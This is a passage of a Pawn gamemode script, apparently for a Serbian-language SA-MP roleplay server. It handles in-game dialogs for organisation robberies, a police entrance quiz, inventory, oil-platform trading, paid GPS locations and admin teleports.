                strcat( DialogStrgEx1, ""SRVBOJA1SCM"AirDrop -> "col_white"Vas AirDrop paket mogu pokupiti i drugi igraci nakon sto padne, kao sto vi mozete tudje\n");

                SPD(playerid, 0, DSMSG, ""SRVBOJA1SCM"AirDrop", DialogStrgEx1, "Potvrdi", "");

                return 1;
            }
            case 7: {

                strcat( DialogStrgEx1, ""SRVBOJA1SCM"__________________________"col_white" Pljackanje Organizacija "SRVBOJA1SCM"__________________________\n\n");

                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Pljackanje Organizacija Slaba Tacka -> "col_white"Da bi opljackali neku organizaciju potrebno je prvo naci njenu slabu tacku\n");
                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Pljackanje Organizacija Slaba Tacka -> "col_white"Nakon toga komandom /probijslabutacku postavljate dinamit i cekate eksploziju\n");
                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Pljackanje Organizacija Slaba Tacka -> "col_white"Bicete stvoreni u interijeru organizacije i idete do sefa i kucate /opljackajsef\n\n");

                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Pljackanje Organizacija Pljacka -> "col_white"Nakon pokretanja komande, cekate odredjeno vreme do zavrsetka pljacke\n");
                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Pljackanje Organizacija Pljacka -> "col_white"Kada se pljacka zavrsi, dobijate 150.000$, a protivnicka organizacija gubi 50.000$\n");

                SPD(playerid, 0, DSMSG, ""SRVBOJA1SCM"Pljackanje Organizacija", DialogStrgEx1, "Potvrdi", "");

                return 1;
            }
            case 8: {

                strcat( DialogStrgEx1, ""SRVBOJA1SCM"__________________________"col_white" Paket Novca ( Za Mafije ) "SRVBOJA1SCM"__________________________\n\n");

                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Paket Novca -> "col_white"Na odredjenoj lokaciji, na odredjeno vreme se stvara paket novca\n");
                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Paket Novca -> "col_white"Mogu ga pokupiti iskljucivo clanovi mafije ulaskom na pickup torbe\n");

                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Paket Novca -> "col_white"Kada pokupite torbu, potrebno je odneti je na checkpoint ( baza organizacije )\n");
                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Paket Novca -> "col_white"Ukoliko vas neko ubije, torba vam ispada i moze je pokupiti drugi clan mafije\n");
                strcat( DialogStrgEx1, ""SRVBOJA1SCM"Paket Novca -> "col_white"Nakon sto je odnesete u checkpoint, dobijate novac\n");
                
                SPD(playerid, 0, DSMSG, ""SRVBOJA1SCM"Paket Novca", DialogStrgEx1, "Potvrdi", "");

                return 1;
            }
        }

        return 1;
    }

    if(dialogid == dialog_PolicijaTest1) {

        if(!response) return 0;
        if(response) {

            if(listitem == 1) {

                TacnihOdgovoraPD[playerid]++;
            }
            SPD(playerid, dialog_PolicijaTest2, DIALOG_STYLE_LIST, "2)Primarni zadatak policije je:", "A)Uzeti opremu\nB)Poci do banke\nC)Zastita gradjana", "Potvrdi", "Odustani");
        }

        return 1;
    }

    if(dialogid == dialog_PolicijaTest2) {

        if(!response) return 0;
        if(response) {

            if(listitem == 2) {

                TacnihOdgovoraPD[playerid]++;
            }
            SPD(playerid, dialog_PolicijaTest3, DIALOG_STYLE_LIST, "3)Policajac u patrolu ide:", "A)Sam\nB)Sa kolegom\nC)Sa gradonacelnikom", "Potvrdi", "Odustani");
        }

        return 1;
    }

    if(dialogid == dialog_PolicijaTest3) {

        if(!response) return 0;
        if(response) {

            if(listitem == 1) {

                TacnihOdgovoraPD[playerid]++;
            }
            SPD(playerid, dialog_PolicijaTest4, DIALOG_STYLE_LIST, "4)Kada vidite osobu da vozi krivom trakom,vi cete:", "A)Mahnuti\nB)Pustiti ga da ode\nC)Upaliti rotaciju i krenuti za njim", "Potvrdi", "Odustani");
        }

        return 1;
    }

    if(dialogid == dialog_PolicijaTest4) {

        if(!response) return 0;
        if(response) {

            if(listitem == 2) {

                TacnihOdgovoraPD[playerid]++;
            }
            SPD(playerid, dialog_PolicijaTest5, DIALOG_STYLE_LIST, "5)/m (megafon) sluzi za :", "A)Poteru i pregovaranje\nB)Za oglase", "Potvrdi", "Odustani");
        }

        return 1;
    }

    if(dialogid == dialog_PolicijaTest5) {

        if(!response) return 0;
        if(response) {

            if(listitem == 0) {

                TacnihOdgovoraPD[playerid]++;
            }
            SPD(playerid, dialog_PolicijaTest6, DIALOG_STYLE_LIST, "6)Igrac se svadja sa tvojim kolegom, kako ces postupiti:", "A)Pustiti igraca da se svadja sa tvojim kolegom\nB)Upozoriti igraca\nC)Upozoriti igraca, u slucaju da nastavi, privesti ga", "Potvrdi", "Odustani");
        }

        return 1;
    }

    if(dialogid == dialog_PolicijaTest6) {

        if(!response) return 0;
        if(response) {

            if(listitem == 2) {

                TacnihOdgovoraPD[playerid]++;
            }
            SPD(playerid, dialog_PolicijaTest7, DIALOG_STYLE_LIST, "7)Uocis igraca sa wlom kako ces postupiti?", "A)Krenuti u poteru za njim\nB)Nastaviti svojim putem", "Potvrdi", "Odustani");
        }

        return 1;
    }

    if(dialogid == dialog_PolicijaTest7) {

        if(!response) return 0;
        if(response) {

            if(listitem == 0) {

                TacnihOdgovoraPD[playerid]++;
            }
            SPD(playerid, dialog_PolicijaTest8, DIALOG_STYLE_LIST, "8)Tazer sluzi za?", "A)Lov\nB)Onesposobljavanje\nC)Ubijanje", "Potvrdi", "Odustani");
        }

        return 1;
    }

    if(dialogid == dialog_PolicijaTest8) {

        if(!response) return 0;
        if(response) {

            if(listitem == 1) {

                TacnihOdgovoraPD[playerid]++;
            }
            SPD(playerid, dialog_PolicijaTest9, DIALOG_STYLE_LIST, "9)/su komandu koristimo kada ?", "A)Vidimo igraca kako izlazi iz prodavnice\nB)Vidimo igraca kako koristi cigaru\nC)Vidimo igraca koji krsi zakon", "Potvrdi", "Odustani");
        }

        return 1;
    }

    if(dialogid == dialog_PolicijaTest9) {

        if(!response) return 0;
        if(response) {

            if(listitem == 2) {

                TacnihOdgovoraPD[playerid]++;
            }
            
            if(TacnihOdgovoraPD[playerid] >= 8) {

                TacnihOdgovoraPD[playerid] = 0;
                PlayerInfo[playerid][xPolicijaTest] = 1;
                SavePlayer(playerid);
                SPD(playerid, 0, DIALOG_STYLE_MSGBOX, "Policija Test", "Uspesno ste polozili test za policiju!\nSada se mozete prikljuciti organizaciji!", "Potvrdi", "");
                return 1;
            }
            else {

                TacnihOdgovoraPD[playerid] = 0;
                SPD(playerid, 0, DIALOG_STYLE_MSGBOX, "Policija Test", "Nazalost pali ste test za policiju!\nProbajte ponovo!", "Potvrdi", "");
                return 1;
            }
        }

        return 1;
    }

    if(dialogid == dialog_RanacIzvadiMetkovi && response) {

        new metkovi;
        if(sscanf(inputtext, "d", metkovi)) return SPD(playerid, dialog_RanacIzvadiMetkovi, DIALOG_STYLE_INPUT, "Ranac Izvadi Oruzije", "Unesite koliko zelite metkova da izvadite", "Izvadi", "Odustani");
        if(metkovi < 1) return SPD(playerid, dialog_RanacIzvadiMetkovi, DIALOG_STYLE_INPUT, "Ranac Izvadi Oruzije", "Unesite koliko zelite metkova da izvadite", "Izvadi", "Odustani");
        new slot = inventorySlot[playerid];

        if(PlayerInfo[playerid][xInventory][slot] == 0) return SendErrorMessage(playerid, "Ovaj slot je prazan!");
        if(PlayerInfo[playerid][xInventoryAmmo][slot] < metkovi) return SendErrorMessage(playerid, "Nemas toliko metkova!");

        new itemID = PlayerInfo[playerid][xInventory][slot];

        new ime[32];
        GetWeaponName(itemID, ime, sizeof(ime));

        new gunID = PlayerInfo[playerid][xInventory][slot];

        GiveWeaponToPlayer(playerid, gunID, metkovi);

        Inventory_Remove(playerid, slot, metkovi);

        SendInfoMessage(playerid, "Uzeo si %s sa %d metkova iz ranca!", ime, metkovi);

        return 1;
    }

    if(dialogid == dialog_Inventory && response) {

        Inventory_Take(playerid, listitem);

        return 1;
    }

    if(dialogid == dialog_InventoryCheck && response) {

        new id = ProveraRanac[playerid];

        Inventory_Delete(id, listitem);

        format( globalstring , sizeof( globalstring ), ""col_white"Administrator %s vam je obrisao slot "col_crvena"%d "col_white"na rancu", ImeIgraca( playerid ), listitem );
        SCM( id, -1, globalstring );
        SendClientMessageEx( playerid, -1, "Ocistio si igracu "col_crvena"%s "col_white"slot ranca "col_crvena"%d",ImeIgraca( id ), listitem );
        format( globalstring, sizeof( globalstring ), "RANAC OCISTI | %s je ocistio slot ranca igraca: %s Slot: %d", ImeIgraca( playerid ), ImeIgraca( id ), listitem );
        AdminPoruka( NARACRVENA, globalstring );

        new string[ 128 ]; 
        format( string, sizeof( string ), "Admin %s je ocisto slot ranca igraca %s | Slot: %d", ImeIgraca( playerid ), ImeIgraca( id ), listitem );
        LogSave( "Ostalo/LogRanacOcisti.log", string );

        return 1;
    }

    if(dialogid == dialog_Stats && response) {

        ShowImovinaStats(playerid, playerid);

        return 1;
    }

    if(dialogid == dialog_StatsCheck && response) {

        ShowImovinaStatsCheck(playerid, ProveraIgraca[playerid]);
        return 1;
    }

    if(dialogid == dialog_Stats_2Check) {

        if(!response) return ShowDialogStatsCheck(playerid, ProveraIgraca[playerid]);
        if(response) return 0;
    }

    if(dialogid == dialog_Stats_2) {

        if(!response) return ShowDialogStats(playerid, playerid);
        if(response) return 0;
    }

    if(dialogid == dialog_Nafta) {

        if(!response) return 0;
        if(response) {

            switch(listitem) {

                case 0: {

                    new str[124];
                    new id = PlayerInfo[playerid][xNaftaID];

                    format( str, sizeof( str ),""PLATFORMACOLOR"Trenutni Novac: {FFFFFF}[%d $]",NaftaInfo[id][pNovac]);
                    ShowPlayerDialog( playerid, 0, DSMSG, ""col_crvena"Kasa Naftne Platforme", str, "U redu", "" );

                    return 1;
                }
                case 1: {

                    ShowPlayerDialog(playerid, dialog_NaftaPodigni, DIALOG_STYLE_INPUT, "Podigni Novac", "Unesite koliko novca zelite podici", "Potvrdi", "Odustani");
                    return 1;
                }
                case 2: {

                    new price = NAFTNAPLATFORMA_PRICE / 4;
                    new str[128];
                    format(str, sizeof(str), "Da li ste sigurni da zelite da prodate vasu Naftnu Platformu za %d$?", price);
                    ShowPlayerDialog(playerid, dialog_NaftaSell, DIALOG_STYLE_MSGBOX, "Prodaja Drzavi", str, "Prodaj", "Odustani");

                    return 1;
                }
                case 3: {

                    if(ProdajeImovinu[playerid]) return SendErrorMessage(playerid, "Ne mozes to dok cekas odgovor od igraca na kupovinu!");

                    ShowPlayerDialog(playerid, dialog_NaftaSellPlayer, DIALOG_STYLE_INPUT, "Naftna Platforma Prodaj Igracu", "Unesite : ID igraca i cenu\nPrimer : 14 1500000", "Ponudi", "Odustani");

                    return 1;
                }
            }
        }
    }

    if(dialogid == dialog_NaftaSellPlayer && response) {

        new idw = PlayerInfo[playerid][xNaftaID];
        if(idw == -1) return SendErrorMessage(playerid, "Ne posedujes Naftnu Platformu!");

        if(ProdajeImovinu[playerid]) return SendErrorMessage(playerid, "Ne mozes to dok cekas odgovor od igraca na kupovinu!");

        new cena, id;
        if(sscanf(inputtext, "ud", id, cena)) return ShowPlayerDialog(playerid, dialog_NaftaSellPlayer, DIALOG_STYLE_INPUT, "Naftna Platforma Prodaj Igracu", "Unesite : ID igraca i cenu\nPrimer : 14 1500000", "Ponudi", "Odustani");
        if(!IsPlayerConnected(id)) return SendErrorMessage(playerid, "Pogresan ID!");
        if(PlayerInfo[id][xNaftaID] != -1) return SendErrorMessage(playerid, "Igrac vec poseduje naftnu platformu!");

        if(cena < 1 || cena > 99999999) return SendErrorMessage(playerid, "Cena ne moze biti manja od 1 ili veca od 99.999.999$!");

        ProdajeImovinu[playerid] = true;
        GlobalProdaja[id] = playerid;
        GlobalCena[id] = cena;
        new string[128];
        format(string, sizeof(string), "Igrac %s vam je ponudio svoju Naftnu Platformu za %d$!", ImeIgraca(playerid), cena);

        ShowPlayerDialog(id, dialog_NaftaSellPlayerAccept, DIALOG_STYLE_MSGBOX, "Kupi Naftnu Platformu", string, "Kupi", "Odustani");

        return 1;
    }

    if(dialogid == dialog_NaftaSellPlayerAccept) {

        if(!response) {

            new player = GlobalProdaja[playerid];
            GlobalProdaja[playerid] = -1;
            GlobalCena[playerid] = 0;

            ProdajeImovinu[player] = false;
            SendInfoMessage(playerid, "Odustao si od kupovine!");
            SendInfoMessage(player, "Igrac %s je odustao od kupovine!", ImeIgraca(playerid));

            return 1;
        }

        if(response) {

            new id = GlobalProdaja[playerid];
            new cena = GlobalCena[playerid];

            if(GetPlayerMoney(playerid) < GlobalCena[playerid]) {

                GlobalProdaja[playerid] = -1;
                GlobalCena[playerid] = 0;

                ProdajeImovinu[id] = false;
                SendInfoMessage(playerid, "Odustao si od kupovine zato sto nemas dovoljno novca!");
                SendInfoMessage(id, "Igrac %s je odustao od kupovine zato sto nema dovoljno novca!", ImeIgraca(playerid));

                return 1;
            }

            GlobalProdaja[playerid] = -1;
            GlobalCena[playerid] = 0;

            ProdajeImovinu[id] = false;

            new workshopID = PlayerInfo[id][xNaftaID];

            strmid(NaftaInfo[workshopID][pVlasnik], ImeIgraca(playerid),0,strlen(ImeIgraca(playerid)),255);
            SacuvajNaftnuPlatformu(workshopID);
            NaftaLabelUpdate(workshopID);

            PlayerInfo[playerid][xNaftaID] = workshopID;
            SavePlayer(playerid);

            PlayerInfo[id][xNaftaID] = -1;
            SavePlayer(id);

            DajIgracuNovac(id, cena);
            DajIgracuNovac(playerid, -cena);

            SendInfoMessage(id, "Prodao si svoju naftnu platformu igracu %s za %d$", ImeIgraca(playerid), cena);
            SendInfoMessage(playerid, "Kupio si naftnu platformu od igraca %s za %d$", ImeIgraca(id), cena);

            return 1;
        }

        return 1;
    }

    if(dialogid == dialog_NaftaSell && response) {

        new id = PlayerInfo[playerid][xNaftaID];
        if(id == -1) return SendErrorMessage(playerid, "Ne posedujes Naftnu Platformu!");

        strmid(NaftaInfo[id][pVlasnik],"Niko",0,strlen("Niko"),255);
        NaftaInfo[id][pNovac] = 0;
        SacuvajNaftnuPlatformu(id);

        if(IsValidDynamic3DTextLabel(NaftaLabel[id]))
            DestroyDynamic3DTextLabel(NaftaLabel[id]);

        if(IsValidDynamicPickup(NaftaPickup[id]))
            DestroyDynamicPickup(NaftaPickup[id]);

        new string[220];
        format(string, 220, ""PLATFORMACOLOR"[ Naftna Platforma ]\nVlasnik : "col_white"NIKO\n"PLATFORMACOLOR"ID: "col_white"%d\n"PLATFORMACOLOR"Cena: "col_white"%d$\n"PLATFORMACOLOR"Da kupis naftnu platformu koristi /kupiplatformu", id, NAFTNAPLATFORMA_PRICE);
        NaftaLabel[id] = CreateDynamic3DTextLabel(string, 0x33CCFFAA, NaftaInfo[id][pUlazX], NaftaInfo[id][pUlazY], NaftaInfo[id][pUlazZ], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, STREAMER_3D_TEXT_LABEL_SD, -1, 0);
        NaftaPickup[id] = CreateDynamicPickup(18631, 1, NaftaInfo[id][pUlazX], NaftaInfo[id][pUlazY], NaftaInfo[id][pUlazZ], -1, -1, -1, STREAMER_PICKUP_SD, -1, 0);

        DajIgracuNovac(playerid, NAFTNAPLATFORMA_PRICE/4);
        PlayerInfo[playerid][xNaftaID] = -1;
        SavePlayer(playerid);

        SendInfoMessage(playerid, "Uspesno si prodao naftnu platformu za %d$!", NAFTNAPLATFORMA_PRICE/4);

        return 1;
    }

    if(dialogid == dialog_NaftaPodigni) {

        if(!response) return 0;
        if(response) {

            new novac = strval(inputtext);
            new id = PlayerInfo[playerid][xNaftaID];

            if(novac < 1 || novac > 1000000) return SendErrorMessage(playerid, "Ne mozes manje od 1 ili vise od 1.000.000$ odjednom!");
            if(NaftaInfo[id][pNovac] < novac) return SendErrorMessage(playerid, "Nemas toliko novca!");

            DajIgracuNovacSpeech(playerid, novac);
            SavePlayer(playerid);

            NaftaInfo[id][pNovac] -= novac;
            SacuvajNaftnuPlatformu(id);

            SendInfoMessage(playerid, "Uspesno si podigao %d$ sa naftne platforme!", novac);

            return 1;
        }
        return 1;
    }

    if(dialogid == dialog_NaftaEdit && response) {

        if(listitem == 0) {

            new id = GetNearestNaftnaPlatforma(playerid);
            if(id == -1) return SendErrorMessage(playerid, "U blizini nema nijedna Naftna Platforma!");

            if(!strcmp( NaftaInfo[id][pVlasnik], "Niko", true )) return SendErrorMessage(playerid, "Ova naftna platforma nema vlasnika!");

            strmid(NaftaInfo[id][pVlasnik],"Niko",0,strlen("Niko"),255);
            NaftaInfo[id][pNovac] = 0;
            SacuvajNaftnuPlatformu(id);

            if(IsValidDynamic3DTextLabel(NaftaLabel[id]))
                DestroyDynamic3DTextLabel(NaftaLabel[id]);

            if(IsValidDynamicPickup(NaftaPickup[id]))
                DestroyDynamicPickup(NaftaPickup[id]);

            new string[220];
            format(string, 220, ""PLATFORMACOLOR"[ Naftna Platforma ]\nVlasnik : "col_white"NIKO\n"PLATFORMACOLOR"ID: "col_white"%d\n"PLATFORMACOLOR"Cena: "col_white"%d$\n"PLATFORMACOLOR"Da kupis naftnu platformu koristi /kupiplatformu", id, NAFTNAPLATFORMA_PRICE);
            NaftaLabel[id] = CreateDynamic3DTextLabel(string, 0x33CCFFAA, NaftaInfo[id][pUlazX], NaftaInfo[id][pUlazY], NaftaInfo[id][pUlazZ], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, STREAMER_3D_TEXT_LABEL_SD, -1, 0);
            NaftaPickup[id] = CreateDynamicPickup(18631, 1, NaftaInfo[id][pUlazX], NaftaInfo[id][pUlazY], NaftaInfo[id][pUlazZ], -1, -1, -1, STREAMER_PICKUP_SD, -1, 0);

            foreach(Player, i) {

                if(PlayerInfo[i][xNaftaID] == id) {

                    PlayerInfo[i][xNaftaID] = -1;
                    SavePlayer(i);
                    SendInfoMessage(i, "Admin je prodao tvoju Naftnu Platformu!");
                }
            }

            SendInfoMessage(playerid, "Uspesno si prodao naftnu platformu!");

            return 1;
        }

        return 1;
    }

    if(dialogid == dialog_Slut && response) {

        new id = getNearestSlut(playerid);
        if(id == -1) return SendErrorMessage(playerid, "Nisi blizu nijedne kurve!");

        if(IsPlayerInAnyVehicle(playerid)) return SendErrorMessage(playerid, "Ne mozes iz vozila!");

        if(slutRadi[id]) return SendErrorMessage(playerid, "Kurva je zauzeta!");

        if(listitem == 0) {

            if(GetPlayerMoney(playerid) < 400) return SendErrorMessage(playerid, "Nemas dovoljno novca!");

            ApplyDynamicActorAnimation(slutActor[id], "BLOWJOBZ", "BJ_COUCH_LOOP_W", 4.0, 1, 1, 1, 1, 0);
            slutRadi[id] = true;

            defer slutBlowJobTimer(playerid, id);

            DajIgracuNovac(playerid, -400);
            TogglePlayerControllable( playerid, false);

            //ApplyActorAnimation(Variable, "Blowjobz", "BJ_Stand_Loop_W", 4.0, 1, 1, 1, 0, 0);
            ApplyAnimation( playerid, "Blowjobz", "BJ_Stand_Loop_P", 4.0, 1, 0, 0, 1, 0);

            format( globalstring, sizeof( globalstring ), "** %s placa kurvu i ona se baca na posao.", ImeIgraca( playerid ) );
            PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
            SCM( playerid, ZUTA, "Platio si kurvu 400$ za pusenje.");

            return 1;
        }
        if(listitem == 1) {

            if(GetPlayerMoney(playerid) < 500) return SendErrorMessage(playerid, "Nemas dovoljno novca!");
            if( UzeoOpremu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes ovo dok radis posao ili imas uniformu posla." );

            DajIgracuNovac(playerid, -500);
            setPlayerGps(playerid, 4551.8926,-327.4721,11.0860);

            SendInfoMessage(playerid, "Uspesno si kupio lokaciju za 500$! Prati GPS!");

            return 1;
        }

        if(listitem == 2) {

            if(GetPlayerMoney(playerid) < 1500) return SendErrorMessage(playerid, "Nemas dovoljno novca!");
            if( UzeoOpremu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes ovo dok radis posao ili imas uniformu posla." );

            DajIgracuNovac(playerid, -1500);
            setPlayerGps(playerid, 525.3239,-2563.0830,4.2118);

            SendInfoMessage(playerid, "Uspesno si kupio lokaciju za 1500$! Prati GPS!");

            return 1;
        }

        if(listitem == 3) {

            if(GetPlayerMoney(playerid) < 1000) return SendErrorMessage(playerid, "Nemas dovoljno novca!");
            if( UzeoOpremu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes ovo dok radis posao ili imas uniformu posla." );

            DajIgracuNovac(playerid, -1000);
            setPlayerGps(playerid, 3823.3127,-1152.8422,10.9416);

            SendInfoMessage(playerid, "Uspesno si kupio lokaciju za 1000$! Prati GPS!");

            return 1;
        }

        if(listitem == 4) {

            if(GetPlayerMoney(playerid) < 4000) return SendErrorMessage(playerid, "Nemas dovoljno novca!");
            if( UzeoOpremu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes ovo dok radis posao ili imas uniformu posla." );

            DajIgracuNovac(playerid, -4000);
            setPlayerGps(playerid, BribePozicije[BribeTrenutni][0], BribePozicije[BribeTrenutni][1], BribePozicije[BribeTrenutni][2]);

            SendInfoMessage(playerid, "Uspesno si kupio lokaciju za 4000$! Prati GPS!");

            return 1;
        }

        if(listitem == 5) {

            if(GetPlayerMoney(playerid) < 3000) return SendErrorMessage(playerid, "Nemas dovoljno novca!");
            if( UzeoOpremu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes ovo dok radis posao ili imas uniformu posla." );

            DajIgracuNovac(playerid, -3000);
            setPlayerGps(playerid, -67.6665,-1109.5308,1.0781);

            SendInfoMessage(playerid, "Uspesno si kupio lokaciju za 3000$! Prati GPS!");

            return 1;
        }

        if(listitem == 6) {

            if(GetPlayerMoney(playerid) < 2000) return SendErrorMessage(playerid, "Nemas dovoljno novca!");
            if( UzeoOpremu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes ovo dok radis posao ili imas uniformu posla." );

            DajIgracuNovac(playerid, -2000);
            setPlayerGps(playerid, -88.8597,-1212.3195,2.8906);

            SendInfoMessage(playerid, "Uspesno si kupio lokaciju za 2000$! Prati GPS!");

            return 1;
        }

        if(listitem == 7) {

            if(GetPlayerMoney(playerid) < 3000) return SendErrorMessage(playerid, "Nemas dovoljno novca!");
            if( UzeoOpremu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes ovo dok radis posao ili imas uniformu posla." );

            DajIgracuNovac(playerid, -3000);
            setPlayerGps(playerid, -2843.5918,-1512.3604,138.1209);

            SendInfoMessage(playerid, "Uspesno si kupio lokaciju za 3000$! Prati GPS!");

            return 1;
        }

        if(listitem == 8) {

            if(GetPlayerMoney(playerid) < 2500) return SendErrorMessage(playerid, "Nemas dovoljno novca!");
            if( UzeoOpremu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes ovo dok radis posao ili imas uniformu posla." );

            DajIgracuNovac(playerid, -2500);
            setPlayerGps(playerid, 2153.1089,-2267.3169,13.3015);

            SendInfoMessage(playerid, "Uspesno si kupio lokaciju za 2500$! Prati GPS!");

            return 1;
        }

        if(listitem == 9) {

            if(GetPlayerMoney(playerid) < 1000) return SendErrorMessage(playerid, "Nemas dovoljno novca!");
            if( UzeoOpremu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes ovo dok radis posao ili imas uniformu posla." );

            DajIgracuNovac(playerid, -1000);
            setPlayerGps(playerid, 2090.8804,-978.9796,52.1011);

            SendInfoMessage(playerid, "Uspesno si kupio lokaciju za 1000$! Prati GPS!");

            return 1;
        }

        return 1;
    }

    // if(dialogid == dialog_WPanel && response) {

    //     if(listitem == 0) {

    //         if(snowOn[playerid])
    //         {
    //             DeleteSnow(playerid);
    //             SendInfoMessage(playerid, "Iskljucio si sneg!");
    //         }
    //         else
    //         {
    //             CreateSnow(playerid);
    //             SendInfoMessage(playerid, "Ukljucio si sneg!");
    //         }
    //         return 1;
    //     }
    //     if(listitem == 1) {

    //         if(nosiKapicu[playerid]) { 
    //             kapicaControl(playerid, false);
    //             SendInfoMessage(playerid, "Skinuo si novogodisnju kapicu!");
    //             return 1;
    //         }
    //         else { 
    //             kapicaControl(playerid, true);
    //             SendInfoMessage(playerid, "Stavio si novogodisnju kapicu!");
    //             return 1;
    //         }
    //     }

    //     return 1;
    // }

    if(dialogid == dialog_SelectJob && response) {

        new jobID = listitem;

        new id = OdabraniIgracPosao[playerid];

        PlayerInfo[ id ][ xPosao ] = jobID; PlayerInfo[ id ][ xUgovor ] = 3; PlayerInfo[id][xJobSkill] = 0; PlayerInfo[playerid][xDeliveryBroj] = 0; SavePlayer( id ); 
        SendClientMessageEx( id, SVETLOPLAVA, "Admin %s vam je postavio posao %s.",ImeIgraca( playerid ), jobsInfos[jobID][jName] );
        SendClientMessageEx( playerid, SVETLOPLAVA, " Postavili ste igracu: %s posao %s.", ImeIgraca( id ), jobsInfos[jobID][jName] );

        return 1;
    }

    if(dialogid == dialog_portVrsta && response) {

        if(listitem == 0) { //Vazne lokacije

            new string[128], BigString[2000];
            for(new id = 0; id < MAX_PORTING; id++)
            {
                new wFile[40];
                format(wFile, 40, PORTING_FILE, id);
                if(fexist(wFile))
                {
                    if(portInfo[id][portVrsta] == 1) {

                        format(string, sizeof(string), "%s\n", portInfo[id][portIme]);
                        strcat(BigString, string);
                    }
                }
            }
            if(isnull(BigString)) return SendErrorMessage(playerid, "Nema kreiranih portova!");

            ShowPlayerDialog(playerid, dialog_selectPort, DIALOG_STYLE_LIST, "Odaberi Port", BigString, "Odaberi", "Odustani");

            return 1;
        }
        if(listitem == 1) { //Poslovi

            new string[128], BigString[2000];
            for(new id = 0; id < MAX_PORTING; id++)
            {
                new wFile[40];
                format(wFile, 40, PORTING_FILE, id);
                if(fexist(wFile))
                {
                    if(portInfo[id][portVrsta] == 2) {

                        format(string, sizeof(string), "%s\n", portInfo[id][portIme]);
                        strcat(BigString, string);
                    }
                }
            }
            if(isnull(BigString)) return SendErrorMessage(playerid, "Nema kreiranih portova!");

            ShowPlayerDialog(playerid, dialog_selectPort, DIALOG_STYLE_LIST, "Odaberi Port", BigString, "Odaberi", "Odustani");

            return 1;
        }
        if(listitem == 2) { //Organizacije port

            new string[128], BigString[2000];
            for(new id = 0; id < MAX_ORG; id++)
            {
                new wFile[40];
                format(wFile, 40, O_FILE, id);
                if(fexist(wFile))
                {
                    format(string, sizeof(string), "%s\n", OI[id][oName]);
                    strcat(BigString, string);
                }
            }
            if(isnull(BigString)) return SendErrorMessage(playerid, "Nema kreiranih organizacija!");

            ShowPlayerDialog(playerid, dialog_selectPortOrg, DIALOG_STYLE_LIST, "Odaberi Port", BigString, "Odaberi", "Odustani");

            return 1;
        }

        return 1;
    }

    if(dialogid == dialog_selectPortOrg && response) {

        new tmpcar = GetPlayerVehicleID(playerid);

        for(new id = 1; id < MAX_ORG; id++) {

            new File[40];
            format( File, sizeof( File ), O_FILE, id );
            if(fexist(File)) {

                if(!strcmp(OI[id][oName], inputtext, true)) {

                    if( GetPlayerState( playerid ) == 2 ) {
                        Novi_SetVehiclePos( tmpcar, OI[ id ][ oPozExtX ], OI[ id ][ oPozExtY ], OI[ id ][ oPozExtZ ] );
                    }
                    else {
                        PortajIgraca( playerid, OI[ id ][ oPozExtX ], OI[ id ][ oPozExtY ], OI[ id ][ oPozExtZ ] );
                    }
                    SetPlayerInterior( playerid,0 );
                    SetPlayerVirtualWorld( playerid,0 );
                    SendClientMessageEx( playerid, BELA, "Teleportovali ste se do organizacije %s ( ID %d )", OI[id][oName], id);

                    if(PlayerInfo[playerid][xVIPLevel] >= 1) {

                        new time;
                        switch(PlayerInfo[playerid][xVIPLevel]) {

                            case 1: 
                                time = 180;
                            case 2, 3, 4:
                                time = 60;
                            case 5:
                                time = 45;
                            case 6:
                                time = 30;
                        }
                        VIPPort[ playerid ] = time;
                        SendInfoMessage(playerid, "Sledeci port mozete koristiti za %d sekundi!", time);
                    }
                    if(PlayerInfo[playerid][xPromoter] >= 1) {

                        PromoterPort[ playerid ] = 180;
                        SendInfoMessage(playerid, "Sledeci port mozete koristiti za 180 sekundi!");
                    }

                    return 1;
                }
            }
        }

        return 1;
    }

    if(dialogid == dialog_selectGPS && response) {

        for(new id = 1; id < MAX_PORTING; id++)
        {

            new wFile[40];
            format(wFile, 40, PORTING_FILE, id);
            if(fexist(wFile))
            {

                if(!strcmp( portInfo[id][portIme], inputtext, true )) {

                    setPlayerGps(playerid, portInfo[id][portPos][0], portInfo[id][portPos][1], portInfo[id][portPos][2]);
                    SendInfoMessage( playerid, "Upalio si GPS na lokaciju %s.", portInfo[ id ][ portIme ] );

                    return 1;
                }
            }
        }

        return 1;
    }

    if(dialogid == dialog_selectPort && response) {

        new tmpcar = GetPlayerVehicleID( playerid );

        for(new id = 1; id < MAX_PORTING; id++)
        {

            new wFile[40];
            format(wFile, 40, PORTING_FILE, id);
            if(fexist(wFile))
            {

                if(!strcmp( portInfo[id][portIme], inputtext, true )) {

                    if( GetPlayerState( playerid ) == 2 ) {
                        Novi_SetVehiclePos( tmpcar, portInfo[id][portPos][0], portInfo[id][portPos][1], portInfo[id][portPos][2] );
                        GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
                        SetTimerEx("SlobodnoSada", 6000, false, "i", playerid );
                        SetCameraBehindPlayer( playerid );
                        TogglePlayerControllable( playerid, 0 );
                    }
                    else {
                        PortajIgraca( playerid, portInfo[id][portPos][0], portInfo[id][portPos][1], portInfo[id][portPos][2] );
                    }
                    SetPlayerInterior( playerid, 0 );
                    SetPlayerVirtualWorld( playerid, 0 );
                    SendInfoMessage( playerid, "Teleportovao si kod %s.", portInfo[ id ][ portIme ] );
                    
                    if(PlayerInfo[playerid][xVIPLevel] >= 1) {

                        new time;
                        switch(PlayerInfo[playerid][xVIPLevel]) {

